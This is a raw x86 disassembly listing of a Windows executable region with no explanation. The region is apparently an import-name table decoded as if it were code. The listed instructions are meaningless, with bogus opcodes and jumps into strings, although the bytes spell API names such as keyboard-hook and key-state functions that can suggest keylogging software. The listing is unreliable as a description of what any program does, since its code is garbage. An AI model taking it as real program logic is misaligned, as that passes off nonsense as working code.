  4133c6:	bound  eax,QWORD PTR [eax]
  4133c8:	inc    ebx
  4133c9:	jb     0x413430
  4133cb:	popa   
  4133cc:	je     0x413433
  4133ce:	push   edi
  4133cf:	imul   ebp,DWORD PTR [esi+0x64],0x7845776f
  4133d6:	inc    ecx
  4133d7:	add    BYTE PTR [ebx+0x2],dh
  4133da:	push   ebx
  4133db:	gs je  0x413435
  4133de:	imul   ebp,DWORD PTR [esi+0x64],0x6554776f
  4133e5:	js     0x41345b
  4133e7:	inc    ecx
  4133e8:	add    BYTE PTR [eax],al
  4133ea:	pop    ecx
  4133eb:	add    dl,BYTE PTR [ebx+0x65]
  4133ee:	je     0x413442
  4133f0:	arpl   WORD PTR gs:[ebp+eax*2+0x6d],si
  4133f5:	jo     0x41346b
  4133f7:	jns    0x4133f9
  4133f9:	add    bh,ah
  4133fb:	add    BYTE PTR [esi+0x72],al
  4133fe:	popa   
  4133ff:	ins    DWORD PTR es:[edi],dx
  413400:	gs push edx
  413402:	arpl   WORD PTR gs:[eax+eax*1+0x3b],si
  413407:	add    DWORD PTR [edi+0x65],eax
  41340a:	je     0x413459
  41340c:	gs jae 0x413482
  41340f:	popa   
  413410:	addr16 gs inc ebp
  413413:	js     0x413489
  413415:	jb     0x413478
  413417:	dec    ecx
  413418:	outs   dx,BYTE PTR ds:[esi]
  413419:	outs   dx,WORD PTR ds:[esi]
  41341b:	add    BYTE PTR [eax+0x2],ch
  41341e:	push   ebx
  41341f:	gs je  0x413477
  413422:	jae    0x413489
  413424:	jb     0x413475
  413426:	bound  ebp,QWORD PTR [edx+0x65]
  413429:	arpl   WORD PTR [ecx+ecx*2+0x6e],si
  41342d:	outs   dx,WORD PTR ds:[esi]
  41342f:	jb     0x41349e
  413431:	popa   
  413432:	je     0x41349d
  413434:	outs   dx,DWORD PTR ds:[esi]
  413435:	outs   dx,BYTE PTR ds:[esi]
  413436:	push   edi
  413437:	add    BYTE PTR [ebx+0x73654400],dl
  41343d:	je     0x4134b1
  41343f:	outs   dx,DWORD PTR ds:[esi]
  413440:	jns    0x413483
  413442:	arpl   WORD PTR [ebx+0x65],sp
  413445:	ins    BYTE PTR es:[edi],dx
  413446:	gs jb  0x4134aa
  413449:	je     0x4134ba
  41344b:	jb     0x4134a1
  41344d:	popa   
  41344e:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  413452:	xor    al,BYTE PTR [ecx]
  413454:	inc    edi
  413455:	gs je  0x4134a5
  413458:	outs   dx,BYTE PTR gs:[esi]
  41345a:	jne    0x4134a5
  41345c:	je     0x4134c3
  41345e:	ins    DWORD PTR es:[edi],dx
  41345f:	inc    ebx
  413460:	outs   dx,DWORD PTR ds:[esi]
  413461:	jne    0x4134d1
  413463:	je     0x413465
  413465:	add    BYTE PTR [ebp+0x79656b02],bh
  41346b:	bound  esp,QWORD PTR [edi+ebx*2+0x65]
  41346f:	jbe    0x4134d6
  413471:	outs   dx,BYTE PTR ds:[esi]
  413472:	je     0x413474
  413474:	call   0x65b1837a
  413479:	outs   dx,BYTE PTR ds:[esi]
  41347a:	dec    ecx
  41347b:	arpl   WORD PTR [edi+0x6e],bp
  41347e:	add    BYTE PTR [eax],al
  413480:	das    
  413481:	add    dl,BYTE PTR [ebx+0x65]
  413484:	je     0x4134c7
  413486:	arpl   WORD PTR [ecx+ebp*2+0x76],si
  41348a:	gs push edi
  41348c:	imul   ebp,DWORD PTR [esi+0x64],0x5f00776f
  413493:	add    dl,BYTE PTR [ebx+0x65]
  413496:	je     0x4134eb
  413498:	jns    0x41350d
  41349a:	inc    ebx
  41349b:	outs   dx,DWORD PTR ds:[esi]
  41349c:	ins    BYTE PTR es:[edi],dx
  41349d:	outs   dx,DWORD PTR ds:[esi]
  41349e:	jb     0x413513
  4134a0:	add    BYTE PTR [eax],al
  4134a2:	mov    dh,0x1
  4134a4:	dec    esp
  4134a5:	outs   dx,DWORD PTR ds:[esi]
  4134a6:	popa   
  4134a7:	fs dec ebp
  4134a9:	outs   dx,BYTE PTR gs:[esi]
  4134ab:	jne    0x4134ee
  4134ad:	add    BYTE PTR ds:0x61684300,ch
  4134b3:	jb     0x413503
  4134b5:	gs js  0x41352c
  4134b8:	push   edi
  4134b9:	add    dh,cl
  4134bb:	add    DWORD PTR [ebp+0x65],ecx
  4134be:	jae    0x413533
  4134c0:	popa   
  4134c1:	addr16 gs inc edx
  4134c4:	outs   dx,DWORD PTR ds:[esi]
  4134c5:	js     0x413508
  4134c7:	add    BYTE PTR [edx+eax*1+0x6e617254],dl
  4134ce:	jae    0x41353c
  4134d0:	popa   
  4134d1:	je     0x413538
  4134d3:	inc    ecx
  4134d4:	arpl   WORD PTR [ebx+0x65],sp
  4134d7:	ins    BYTE PTR es:[edi],dx
  4134d8:	gs jb  0x41353c
  4134db:	je     0x41354c
  4134dd:	jb     0x413536
  4134df:	add    BYTE PTR [ecx+0x66654400],cl
  4134e5:	inc    esi
  4134e6:	jb     0x413549
  4134e8:	ins    DWORD PTR es:[edi],dx
  4134e9:	gs push eax
  4134eb:	jb     0x41355c
  4134ed:	arpl   WORD PTR [ecx+0x0],ax
  4134f0:	test   DWORD PTR [edx],eax
  4134f2:	push   ebx
  4134f3:	jns    0x413568
  4134f5:	je     0x41355c
  4134f7:	ins    DWORD PTR es:[edi],dx
  4134f8:	push   eax
  4134f9:	popa   
  4134fa:	jb     0x41355d
  4134fc:	ins    DWORD PTR es:[edi],dx
  4134fd:	gs je  0x413565
  413500:	jb     0x413575
  413502:	dec    ecx
  413503:	outs   dx,BYTE PTR ds:[esi]
  413504:	outs   dx,WORD PTR ds:[esi]
  413506:	inc    ecx
  413507:	add    BYTE PTR ds:0x67655202,al
  41350d:	imul   esi,DWORD PTR [ebx+0x74],0x6c437265
  413514:	popa   
  413515:	jae    0x41358a
  413517:	push   edi
  413518:	add    BYTE PTR [eax],al
  41351a:	iret   
  41351b:	add    DWORD PTR [ebp+0x65],ecx
  41351e:	jae    0x413593
  413520:	popa   
  413521:	addr16 gs inc edx
  413524:	outs   dx,DWORD PTR ds:[esi]
  413525:	js     0x41356c
  413527:	js     0x41356a
  413529:	add    BYTE PTR [ecx],ch
  41352b:	add    BYTE PTR [ebx+0x68],al
  41352e:	popa   
  41352f:	jb     0x41357d
  413531:	outs   dx,DWORD PTR ds:[esi]
  413532:	ja     0x413599
  413534:	jb     0x41358d
  413536:	add    BYTE PTR [eax],al
  413538:	pushf  
  413539:	add    BYTE PTR [ecx+ebp*2+0x61],al
  41353d:	ins    BYTE PTR es:[edi],dx
  41353e:	outs   dx,DWORD PTR ds:[esi]
  41353f:	addr16 inc edx
  413541:	outs   dx,DWORD PTR ds:[esi]
  413542:	js     0x413594
  413544:	popa   
  413545:	jb     0x4135a8
  413547:	ins    DWORD PTR es:[edi],dx
  413548:	inc    ecx
  413549:	add    BYTE PTR [esi],bh
  41354b:	add    DWORD PTR [edi+0x65],eax
  41354e:	je     0x41359d
  413550:	gs jae 0x4135c6
  413553:	popa   
  413554:	addr16 gs push edi
  413557:	add    BYTE PTR [edi+0x2],dl
  41355a:	push   ebx
  41355b:	gs je  0x4135ae
  41355e:	jb     0x4135cf
  413560:	jo     0x4135b9
  413562:	add    BYTE PTR [eax],al
  413564:	loope  0x413566
  413566:	inc    esi
  413567:	imul   ebp,DWORD PTR [esi+0x64],0x646e6957
  41356e:	outs   dx,DWORD PTR ds:[esi]
  41356f:	ja     0x4135b2
  413571:	add    BYTE PTR [ecx+eax*1+0x68437349],dl
  413578:	imul   ebp,DWORD PTR [esp+eiz*2+0x0],0x6f43004a
  413580:	jo     0x4135fb
  413582:	inc    ecx
  413583:	arpl   WORD PTR [ebx+0x65],sp
  413586:	ins    BYTE PTR es:[edi],dx
  413587:	gs jb  0x4135eb
  41358a:	je     0x4135fb
  41358c:	jb     0x4135e2
  41358e:	popa   
  41358f:	bound  ebp,QWORD PTR [ebp+eiz*2+0x57]
  413593:	add    cl,al
  413595:	add    BYTE PTR [ebp+0x6e],al
  413598:	popa   
  413599:	bound  ebp,QWORD PTR [ebp+eiz*2+0x57]
  41359d:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  4135a4:	pop    edx
  4135a5:	add    dl,BYTE PTR [ebx+0x65]
  4135a8:	je     0x4135fd
  4135aa:	arpl   WORD PTR [edx+0x6f],si
  4135ad:	ins    BYTE PTR es:[edi],dx
  4135ae:	ins    BYTE PTR es:[edi],dx
  4135af:	dec    ecx
  4135b0:	outs   dx,BYTE PTR ds:[esi]
  4135b1:	outs   dx,WORD PTR ds:[esi]
  4135b3:	add    BYTE PTR [ecx+eax*1+0x64616f4c],bh
  4135ba:	push   ebx
  4135bb:	je     0x41362f
  4135bd:	imul   ebp,DWORD PTR [esi+0x67],0x350057
  4135c4:	inc    ebx
  4135c5:	push   0x6f547261
  4135ca:	dec    edi
  4135cb:	gs ins DWORD PTR es:[edi],dx
  4135cd:	push   edi
  4135ce:	add    BYTE PTR [eax],al
  4135d0:	inc    BYTE PTR [eax]
  4135d2:	inc    edi
  4135d3:	gs je  0x413619
  4135d6:	ins    BYTE PTR es:[edi],dx
  4135d7:	imul   esi,DWORD PTR [eax+0x43],0x6f737275
  4135de:	jb     0x4135e0
  4135e0:	dec    edx
  4135e1:	add    dl,BYTE PTR [ebx+0x65]
  4135e4:	je     0x413633
  4135e6:	outs   dx,BYTE PTR gs:[esi]
  4135e8:	jne    0x41362e
  4135ea:	gs popaw 
  4135ed:	jne    0x41365b
  4135ef:	je     0x41363a
  4135f1:	je     0x413658
  4135f3:	ins    DWORD PTR es:[edi],dx
  4135f4:	add    BYTE PTR [eax],al
  4135f6:	mov    DWORD PTR [ecx],eax
  4135f8:	dec    ecx
  4135f9:	outs   dx,BYTE PTR ds:[esi]
  4135fa:	jbe    0x41365d
  4135fc:	ins    BYTE PTR es:[edi],dx
  4135fd:	imul   esp,DWORD PTR [ecx+eiz*2+0x74],0x63655265
  413605:	je     0x413607
  413607:	add    BYTE PTR [ecx+0x616f4c01],ch
  41360d:	fs inc edx
  41360f:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0x15004170
  413617:	add    DWORD PTR [edi+0x65],eax
  41361a:	je     0x413662
  41361c:	outs   dx,DWORD PTR ds:[esi]
  41361d:	jb     0x413684
  41361f:	addr16 jb 0x413691
  413622:	jne    0x413692
  413624:	fs push edi
  413626:	imul   ebp,DWORD PTR [esi+0x64],0xb800776f
  41362d:	add    BYTE PTR [edx+esi*2+0x61],al
  413631:	ja     0x413686
  413633:	je     0x413696
  413635:	je     0x41369c
  413637:	push   edi
  413638:	add    BYTE PTR [eax],al
  41363a:	xchg   ebx,eax
  41363b:	add    dl,BYTE PTR [edx+esi*2+0x61]
  41363f:	outs   dx,BYTE PTR ds:[esi]
  413640:	jae    0x4136ae
  413642:	popa   
  413643:	je     0x4136aa
  413645:	inc    ecx
  413646:	arpl   WORD PTR [ebx+0x65],sp
  413649:	ins    BYTE PTR es:[edi],dx
  41364a:	gs jb  0x4136ae
  41364d:	je     0x4136be
  41364f:	jb     0x413692
  413651:	add    BYTE PTR [eax+0x57734901],ah
  413657:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  41365e:	and    eax,0x6e655302
  413663:	fs dec ecx
  413665:	outs   dx,BYTE PTR ds:[esi]
  413666:	jo     0x4136dd
  413668:	je     0x41366a
  41366a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41366b:	add    DWORD PTR [ebx+0x69],ecx
  41366e:	ins    BYTE PTR es:[edi],dx
  41366f:	ins    BYTE PTR es:[edi],dx
  413670:	push   esp
  413671:	imul   ebp,DWORD PTR [ebp+0x65],0x1b10072
  413678:	dec    esp
  413679:	outs   dx,DWORD PTR ds:[esi]
  41367a:	popa   
  41367b:	fs dec ecx
  41367d:	ins    DWORD PTR es:[edi],dx
  41367e:	popa   
  41367f:	addr16 gs inc ecx
  413682:	add    BYTE PTR [eax],al
  413684:	daa    
  413685:	add    DWORD PTR [edi+0x65],eax
  413688:	je     0x4136d5
  41368a:	gs jns 0x4136ef
  41368d:	outs   dx,DWORD PTR ds:[esi]
  41368e:	popa   
  41368f:	jb     0x4136f5
  413691:	push   esp
  413692:	jns    0x413704
  413694:	add    BYTE PTR gs:[ebx+0x61724400],dh
  41369b:	ja     0x4136e6
  41369d:	arpl   WORD PTR [edi+0x6e],bp
  4136a0:	add    BYTE PTR [eax],al
  4136a2:	mov    BYTE PTR [edx],al
  4136a4:	push   esp
  4136a5:	popa   
  4136a6:	bound  esp,QWORD PTR [edx+0x65]
  4136a9:	fs push esp
  4136ab:	gs js  0x413722
  4136ae:	dec    edi
  4136af:	jne    0x413725
  4136b1:	push   edi
  4136b2:	add    BYTE PTR [eax],al
  4136b4:	push   0x74654701
  4136b9:	push   edi
  4136ba:	imul   ebp,DWORD PTR [esi+0x64],0x8200776f
  4136c1:	add    DWORD PTR [ecx+0x6e],ecx
  4136c4:	data16 ins BYTE PTR es:[edi],dx
  4136c6:	popa   
  4136c7:	je     0x41372e
  4136c9:	push   edx
  4136ca:	arpl   WORD PTR gs:[eax+eax*1-0x2b],si
  4136cf:	add    DWORD PTR [ebp+0x65],ecx
  4136d2:	jae    0x413747
  4136d4:	popa   
  4136d5:	addr16 gs inc edx
  4136d8:	outs   dx,DWORD PTR ds:[esi]
  4136d9:	js     0x413732
  4136db:	add    BYTE PTR [eax],bh
  4136dd:	add    dl,BYTE PTR [ebx+0x65]
  4136e0:	je     0x413725
  4136e2:	jne    0x413756
  4136e4:	jae    0x413755
  4136e6:	jb     0x4136e8
  4136e8:	mov    es,WORD PTR [edx]
  4136ea:	push   esp
  4136eb:	outs   dx,DWORD PTR ds:[esi]
  4136ec:	push   ebp
  4136ed:	outs   dx,BYTE PTR ds:[esi]
  4136ee:	imul   esp,DWORD PTR [ebx+0x6f],0x78456564
  4136f5:	add    BYTE PTR [esi+0x52734901],bl
  4136fb:	arpl   WORD PTR gs:[ebp+eax*2+0x6d],si
  413700:	jo     0x413776
  413702:	jns    0x413704
  413704:	clc    
  413705:	add    BYTE PTR [edi+0x65],al
  413708:	je     0x41374d
  41370a:	ins    BYTE PTR es:[edi],dx
  41370b:	popa   
  41370c:	jae    0x413781
  41370e:	dec    esp
  41370f:	outs   dx,DWORD PTR ds:[esi]
  413710:	outs   dx,BYTE PTR ds:[esi]
  413711:	addr16 inc ecx
  413713:	add    BYTE PTR [ecx+0x57734901],ah
  413719:	imul   ebp,DWORD PTR [esi+0x64],0x6e45776f
  413720:	popa   
  413721:	bound  ebp,QWORD PTR [ebp+eiz*2+0x64]
  413725:	add    BYTE PTR [edx+eax*1+0x74697753],al
  41372c:	arpl   WORD PTR [eax+0x54],bp
  41372f:	outs   dx,DWORD PTR ds:[esi]
  413730:	push   esp
  413731:	push   0x69577369
  413736:	outs   dx,BYTE PTR ds:[esi]
  413737:	outs   dx,DWORD PTR fs:[esi]
  413739:	ja     0x41373b
  41373b:	add    BYTE PTR [ebx],cl
  41373d:	add    DWORD PTR [edi+0x65],eax
  413740:	je     0x413786
  413742:	inc    ebx
  413743:	inc    ebp
  413744:	js     0x413746
  413746:	stos   DWORD PTR es:[edi],eax
  413747:	add    DWORD PTR [edi+ebp*2+0x61],ecx
  41374b:	fs inc ebx
  41374d:	jne    0x4137c1
  41374f:	jae    0x4137c0
  413751:	jb     0x413794
  413753:	add    BYTE PTR [edx+0x766e4901],cl
  413759:	popa   
  41375a:	ins    BYTE PTR es:[edi],dx
  41375b:	imul   esp,DWORD PTR [ecx+eiz*2+0x74],0x6e675265
  413763:	add    BYTE PTR [edx+0x57734901],ah
  413769:	imul   ebp,DWORD PTR [esi+0x64],0x6e55776f
  413770:	imul   esp,DWORD PTR [ebx+0x6f],0xe4006564
  413777:	add    DWORD PTR [edi+0x66],ecx
  41377a:	data16 jae 0x4137e2
  41377d:	je     0x4137d1
  41377f:	arpl   WORD PTR gs:[eax+eax*1+0x0],si
  413784:	cmp    eax,0x65684300
  413789:	arpl   WORD PTR [ebx+0x52],bp
  41378c:	popa   
  41378d:	imul   ebp,DWORD PTR fs:[edi+0x42],0x6f747475
  413795:	outs   dx,BYTE PTR ds:[esi]
  413796:	add    BYTE PTR [eax],al
  413798:	adc    eax,DWORD PTR [edx]
  41379a:	push   edx
  41379b:	imul   esi,DWORD PTR gs:[bp+di+0x74],0x69577265
  4137a4:	outs   dx,BYTE PTR ds:[esi]
  4137a5:	outs   dx,DWORD PTR fs:[esi]
  4137a7:	ja     0x4137f6
  4137a9:	gs jae 0x41381f
  4137ac:	popa   
  4137ad:	addr16 gs push edi
  4137b0:	add    BYTE PTR [eax],al
  4137b2:	or     al,BYTE PTR [edx]
  4137b4:	push   edx
  4137b5:	imul   esi,DWORD PTR gs:[bp+di+0x74],0x6f487265
  4137be:	je     0x41380b
  4137c0:	gs jns 0x4137c3
  4137c3:	add    BYTE PTR [eax+0x746e4901],cl
  4137c9:	gs jb  0x41383f
  4137cc:	arpl   WORD PTR gs:[edx+edx*2+0x65],si
  4137d1:	arpl   WORD PTR [eax+eax*1-0x17],si
  4137d5:	add    DWORD PTR [edi+0x70],ecx
  4137d8:	outs   dx,BYTE PTR gs:[esi]
  4137da:	dec    ecx
  4137db:	outs   dx,BYTE PTR ds:[esi]
  4137dc:	jo     0x413853
  4137de:	je     0x413824
  4137e0:	gs jae 0x41384e
  4137e3:	je     0x413854
  4137e5:	jo     0x4137e7
  4137e7:	add    BYTE PTR [edx],al
  4137e9:	add    dl,BYTE PTR [edx+0x65]
  4137ec:	imul   esi,DWORD PTR [bp+di+0x74],0x6c437265
  4137f4:	popa   
  4137f5:	jae    0x41386a
  4137f7:	inc    ecx
  4137f8:	add    BYTE PTR [eax],al
  4137fa:	jno    0x4137fe
  4137fc:	push   ebx
  4137fd:	gs je  0x413857
  413800:	imul   ebp,DWORD PTR [esi+0x64],0x6752776f
  413807:	outs   dx,BYTE PTR ds:[esi]
  413808:	add    BYTE PTR [eax],al
  41380a:	mov    ecx,0x616f4c01
  41380f:	fs dec ebp
  413811:	outs   dx,BYTE PTR gs:[esi]
  413813:	jne    0x41386c
  413815:	add    BYTE PTR ds:0x74654701,ch
  41381b:	dec    ebp
  41381c:	outs   dx,BYTE PTR gs:[esi]
  41381e:	jne    0x413863
  413820:	push   0x4d6b6365
  413825:	popa   
  413826:	jb     0x413893
  413828:	inc    esp
  413829:	imul   ebp,DWORD PTR [ebp+0x65],0x6f69736e
  413830:	outs   dx,BYTE PTR ds:[esi]
  413831:	jae    0x413833
  413833:	add    BYTE PTR [esi+0x66654400],cl
  413839:	push   edi
  41383a:	imul   ebp,DWORD PTR [esi+0x64],0x7250776f
  413841:	outs   dx,DWORD PTR ds:[esi]
  413842:	arpl   WORD PTR [ecx+0x0],ax
  413845:	add    BYTE PTR [ebx],al
  413847:	add    BYTE PTR [ecx+0x64],al
  41384a:	push   0x75
  41384c:	jae    0x4138c2
  41384e:	push   edi
  41384f:	imul   ebp,DWORD PTR [esi+0x64],0x6552776f
  413856:	arpl   WORD PTR [ebp+eax*2+0x78],si
  41385a:	add    BYTE PTR [eax],al
  41385c:	add    eax,0x6c6c4100
  413861:	outs   dx,DWORD PTR ds:[esi]
  413862:	ja     0x4138b7
  413864:	gs je  0x4138ad
  413867:	outs   dx,DWORD PTR ds:[esi]
  413868:	jb     0x4138cf
  41386a:	addr16 jb 0x4138dc
  41386d:	jne    0x4138dd
  41386f:	fs push edi
  413871:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  413878:	ja     0x41387b
  41387a:	inc    edi
  41387b:	gs je  0x4138d5
  41387e:	imul   ebp,DWORD PTR [esi+0x64],0x6554776f
  413885:	js     0x4138fb
  413887:	dec    esp
  413888:	outs   dx,BYTE PTR gs:[esi]
  41388a:	addr16 je 0x4138f5
  41388d:	push   edi
  41388e:	add    BYTE PTR [eax],al
  413890:	pushf  
  413891:	add    DWORD PTR [ecx+0x73],ecx
  413894:	dec    ecx
  413895:	arpl   WORD PTR [edi+0x6e],bp
  413898:	imul   esp,DWORD PTR [ebx+0x0],0x53024e00
  41389f:	gs je  0x4138ef
  4138a2:	outs   dx,BYTE PTR gs:[esi]
  4138a4:	jne    0x4138ef
  4138a6:	je     0x41390d
  4138a8:	ins    DWORD PTR es:[edi],dx
  4138a9:	dec    ecx
  4138aa:	outs   dx,BYTE PTR ds:[esi]
  4138ab:	outs   dx,WORD PTR ds:[esi]
  4138ad:	push   edi
  4138ae:	add    BYTE PTR [eax],al
  4138b0:	dec    eax
  4138b1:	add    dl,BYTE PTR [ebx+0x65]
  4138b4:	je     0x413903
  4138b6:	outs   dx,BYTE PTR gs:[esi]
  4138b8:	jne    0x4138ba
  4138ba:	inc    esp
  4138bb:	add    BYTE PTR [ebx+0x6c],al
  4138be:	imul   esi,DWORD PTR [eax+0x43],0x6f737275
  4138c5:	jb     0x4138c7
  4138c7:	add    cl,al
  4138c9:	add    DWORD PTR [edi+ebp*2+0x6f],ecx
  4138cd:	imul   esi,DWORD PTR [ebp+0x70],0x49
  4138d1:	arpl   WORD PTR [edi+0x6e],bp
  4138d4:	dec    ecx
  4138d5:	fs inc esi
  4138d7:	jb     0x413948
  4138d9:	ins    DWORD PTR es:[edi],dx
  4138da:	inc    esp
  4138db:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  4138e2:	jns    0x4138e4
  4138e4:	add    BYTE PTR ss:[ebx+0x68],al
  4138e8:	popa   
  4138e9:	jb     0x413940
  4138eb:	jo     0x41395d
  4138ed:	gs jb  0x413931
  4138f0:	add    BYTE PTR [eax],al
  4138f2:	mov    edi,0x636f4c01
  4138f7:	imul   edx,DWORD PTR [edi+0x69],0x6e
  4138fb:	outs   dx,DWORD PTR fs:[esi]
  4138fd:	ja     0x413954
  4138ff:	jo     0x413965
  413901:	popa   
  413902:	je     0x413969
  413904:	add    BYTE PTR [eax],al
  413906:	cmp    BYTE PTR [ecx],al
  413908:	inc    edi
  413909:	gs je  0x413959
  41390c:	outs   dx,BYTE PTR gs:[esi]
  41390e:	jne    0x413963
  413910:	je     0x413984
  413912:	imul   ebp,DWORD PTR [esi+0x67],0xc9000041
  413919:	add    DWORD PTR [ebp+0x61],ecx
  41391c:	jo     0x413975
  41391e:	imul   ebp,DWORD PTR [esi+0x64],0x6f50776f
  413925:	imul   ebp,DWORD PTR [esi+0x74],0x1620073
  41392c:	inc    edi
  41392d:	gs je  0x413984
  413930:	outs   dx,DWORD PTR ds:[esi]
  413931:	jo     0x41398a
  413933:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  41393a:	pop    ecx
  41393b:	add    BYTE PTR [ebx+0x72],al
  41393e:	gs popa 
  413940:	je     0x4139a7
  413942:	inc    esp
  413943:	imul   esp,DWORD PTR [ecx+0x6c],0x6150676f
  41394a:	jb     0x4139ad
  41394c:	ins    DWORD PTR es:[edi],dx
  41394d:	push   edi
  41394e:	add    BYTE PTR [eax],al
  413950:	inc    edx
  413951:	add    DWORD PTR [edi+0x65],eax
  413954:	je     0x4139a4
  413956:	gs js  0x4139cd
  413959:	inc    esp
  41395a:	ins    BYTE PTR es:[edi],dx
  41395b:	addr16 inc edi
  41395d:	jb     0x4139ce
  41395f:	jne    0x4139d1
  413961:	dec    ecx
  413962:	je     0x4139c9
  413964:	ins    DWORD PTR es:[edi],dx
  413965:	add    bl,bh
  413967:	add    DWORD PTR [eax+0x74],edx
  41396a:	dec    ecx
  41396b:	outs   dx,BYTE PTR ds:[esi]
  41396c:	push   edx
  41396d:	arpl   WORD PTR gs:[eax+eax*1+0x0],si
  413972:	push   ebp
  413973:	push   ebx
  413974:	inc    ebp
  413975:	push   edx
  413976:	xor    esi,DWORD PTR [edx]
  413978:	cs fs ins BYTE PTR es:[edi],dx
  41397b:	ins    BYTE PTR es:[edi],dx
  41397c:	add    BYTE PTR [eax],al
  41397e:	jns    0x4139c5
  413980:	pop    ecx
  413981:	je     0x4139cb
  413983:	push   ebp
  413984:	jp     0x4139f2
  413986:	jae    0x4139f8
  413988:	push   ecx
  413989:	dec    edx
  41398a:	push   0x47
  41398c:	jne    0x4139d4
  41398e:	fidivr WORD PTR ds:0x3de60041
  413994:	inc    ecx
  413995:	add    dh,dl
  413997:	cmp    eax,DWORD PTR [ecx+0x0]
  41399a:	out    dx,al
  41399b:	or     esi,DWORD PTR [edx+0x3a4f7d0e]
  4139a1:	dec    edi
  4139a2:	ja     0x4139f3
  4139a4:	cmp    DWORD PTR [edi+0x4f],ecx
  4139a7:	dec    edi
  4139a8:	cmp    al,0x4f
  4139aa:	jb     0x4139fb
  4139ac:	xor    ecx,DWORD PTR [edi+0x5e]
  4139af:	dec    edi
  4139b0:	ss dec edi
  4139b2:	jnp    0x413a03
  4139b4:	xor    eax,0x2a4f3a4f
  4139b9:	dec    edi
  4139ba:	push   ds
  4139bb:	push   edx
  4139bc:	pop    ds
  4139bd:	push   ebx
  4139be:	cmp    eax,0x3a4f7d4f
  4139c3:	dec    edi
  4139c4:	ja     0x413a15
  4139c6:	cmp    DWORD PTR [edi+0x4f],ecx
  4139c9:	dec    edi
  4139ca:	cmp    al,0x4f
  4139cc:	jb     0x413a1d
  4139ce:	xor    ecx,DWORD PTR [edi+0x5e]
  4139d1:	dec    edi
  4139d2:	ss dec edi
  4139d4:	ins    DWORD PTR es:[edi],dx
  4139d5:	dec    edi
  4139d6:	xor    eax,0x2a4f3a4f
  4139db:	dec    edi
  4139dc:	push   ds
  4139dd:	bound  ebx,QWORD PTR [edi]
  4139df:	arpl   WORD PTR ds:0x3a4f7d4f,di
  4139e5:	dec    edi
  4139e6:	push   0x4f
  4139e8:	cmp    DWORD PTR [edi+0x7b],ecx
  4139eb:	dec    edi
  4139ec:	cmp    eax,0x304f484f
  4139f1:	dec    edi
  4139f2:	cmp    cl,BYTE PTR [edi+0x34]
  4139f5:	dec    edi
  4139f6:	push   ds
  4139f7:	jb     0x413a18
  4139f9:	jae    0x413a0a
  4139fb:	or     DWORD PTR [eax+eax*4],0x7c
  4139ff:	nop
  413a00:	jge    0x413993
  413a02:	aas    
  413a03:	dec    edi
  413a04:	jbe    0x413a55
  413a06:	cmp    cl,BYTE PTR [edi+0x76]
  413a09:	dec    edi
  413a0a:	ds dec edi
  413a0c:	dec    eax
  413a0d:	dec    edi
  413a0e:	cmp    eax,0x314f7b4f
  413a13:	dec    edi
  413a14:	cmp    cl,BYTE PTR [edi+0x36]
  413a17:	dec    edi
  413a18:	push   ds
  413a19:	sbb    BYTE PTR [edi],0x83
  413a1c:	setae  BYTE PTR [eax+edx*4]
  413a20:	jl     0x4139c2
  413a22:	jge    0x4139c5
  413a24:	aas    
  413a25:	dec    edi
  413a26:	jbe    0x413a77
  413a28:	cmp    cl,BYTE PTR [edi+0x76]
  413a2b:	dec    edi
  413a2c:	ds dec edi
  413a2e:	dec    eax
  413a2f:	dec    edi
  413a30:	cmp    eax,0x314f6d4f
  413a35:	dec    edi
  413a36:	cmp    cl,BYTE PTR [edi+0x36]
  413a39:	dec    edi
  413a3a:	push   ds
  413a3b:	xchg   edx,eax
  413a3c:	pop    ds
  413a3d:	xchg   ebx,eax
  413a3e:	bt     DWORD PTR [eax+eiz*4],ecx
  413a42:	jl     0x4139f4
  413a44:	jge    0x4139f7
  413a46:	aas    
  413a47:	dec    edi
  413a48:	ins    BYTE PTR es:[edi],dx
  413a49:	dec    edi
  413a4a:	cmp    cl,BYTE PTR [edi+0x4e]
  413a4d:	dec    edi
  413a4e:	cmp    DWORD PTR [edi+0x7b],ecx
  413a51:	dec    edi
  413a52:	cmp    eax,0x304f554f
  413a57:	dec    edi
  413a58:	cmp    cl,BYTE PTR [edi+0x36]
  413a5b:	dec    edi
  413a5c:	push   ds
  413a5d:	mov    ds:0xb30fa31f,al
  413a62:	or     al,0xb0
  413a64:	jl     0x413a26
  413a66:	jge    0x413a29
  413a68:	aas    
  413a69:	dec    edi
  413a6a:	ins    BYTE PTR es:[edi],dx
  413a6b:	dec    edi
  413a6c:	cmp    cl,BYTE PTR [edi+0x4e]
  413a6f:	dec    edi
  413a70:	cmp    DWORD PTR [edi+0x7c],ecx
  413a73:	dec    edi
  413a74:	cmp    eax,0x334f5f4f
  413a79:	dec    edi
  413a7a:	cmp    cl,BYTE PTR [edi+0x31]
  413a7d:	dec    edi
  413a7e:	push   ds
  413a7f:	mov    dl,0x1f
  413a81:	mov    bl,0xf
  413a83:	ret    
  413a84:	or     al,0xc0
  413a86:	jl     0x413a58
  413a88:	jge    0x413a5b
  413a8a:	aas    
  413a8b:	dec    edi
  413a8c:	ins    BYTE PTR es:[edi],dx
  413a8d:	dec    edi
  413a8e:	cmp    cl,BYTE PTR [edi+0x4e]
  413a91:	dec    edi
  413a92:	cmp    DWORD PTR [edi+0x6a],ecx
  413a95:	dec    edi
  413a96:	cmp    eax,0x304f4e4f
  413a9b:	dec    edi
  413a9c:	cmp    cl,BYTE PTR [edi+0x34]
  413a9f:	dec    edi
  413aa0:	push   ds
  413aa1:	ret    0xc31f
  413aa4:	psrlq  mm1,QWORD PTR [eax+edx*8]
  413aa8:	jl     0x413a8a
  413aaa:	jge    0x413a8d
  413aac:	aas    
  413aad:	dec    edi
  413aae:	ins    BYTE PTR es:[edi],dx
  413aaf:	dec    edi
  413ab0:	cmp    cl,BYTE PTR [edi+0x4e]
  413ab3:	dec    edi
  413ab4:	cmp    DWORD PTR [edi+0x6b],ecx
  413ab7:	dec    edi
  413ab8:	cmp    eax,0x304f484f
  413abd:	dec    edi
  413abe:	cmp    cl,BYTE PTR [edi+0x36]
  413ac1:	dec    edi
  413ac2:	push   ds
  413ac3:	rcr    BYTE PTR [edi],cl
  413ac5:	ror    DWORD PTR [edi],cl
  413ac7:	jecxz  0x413ad5
